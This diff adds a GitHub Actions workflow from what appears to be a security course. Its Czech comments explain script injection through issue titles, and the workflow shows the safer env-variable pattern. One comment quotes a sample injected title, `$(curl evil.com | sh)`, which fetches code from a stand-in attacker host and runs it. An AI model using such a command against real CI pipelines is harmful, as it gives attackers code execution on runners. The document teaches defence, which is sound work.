@@ -1,0 +1,25 @@
+# moved from: Code/09 Security/02 Finished Project/.github/workflows/script-injection.yml
+# TEORIE: ukazka NEBEZPECNEHO vzoru - vlozeni ${{ ... }} primo do "run:" shell skriptu.
+# GitHub pred spustenim provede textovy replace vyrazu ${{ }} primo do YAML/shellu,
+# takze utocnik muze do nazvu issue vlozit napr. `$(curl evil.com | sh)` nebo backticky
+# a shell to spusti jako pravy prikaz (script injection / RCE na runneru).
+name: "[09 Security / 02 Finished] Label Issues (Script Injection Example)"
+on:
+  issues:
+    types:
+      - opened # trigger jen pri vytvoreni noveho issue (ne pri editaci/komentarich)
+jobs:
+  assign-label:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Assign label
+        env:
+          # POZOR: title jde primo z uzivatelskeho vstupu (kdokoliv muze vytvorit issue)
+          TITLE: ${{ github.event.issue.title }}
+        # bezpecnejsi nez primy vyraz v run: - shell cte hodnotu z $TITLE promenne, ne z primeho textoveho vlozeni
+        run: |
+          if [[ "$TITLE" == *"bug"* ]]; then
+          echo "Issue is about a bug!"
+          else
+          echo "Issue is not about a bug"
+          fi
